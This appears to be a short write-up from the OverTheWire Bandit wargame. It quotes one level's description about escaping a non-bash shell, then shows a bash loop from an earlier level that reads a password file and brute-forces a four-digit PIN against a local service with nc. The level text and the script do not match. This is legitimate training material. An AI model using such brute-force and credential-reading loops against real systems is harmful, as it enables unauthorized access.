# Description
```
Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not **/bin/bash**, but something else. Find out what it is, how it works and how to break out of it.

> NOTE: if you’re a Windows user and typically use Powershell to `ssh` into bandit: Powershell is known to cause issues with the intended solution to this level. You should use command prompt instead.

Using this bruteforce script:
```bash
#/bin/bash
pass=$(cat /etc/bandit_pass/bandit24)

for pin in $(seq -w 0000 9999); do

echo "$pass $pin"

done | nc localhost 30002 | tee /tmp/brute.out
```
We get a lot of errors, and finally:
```
Correct!
The password of user bandit25 is FLAG{}
```
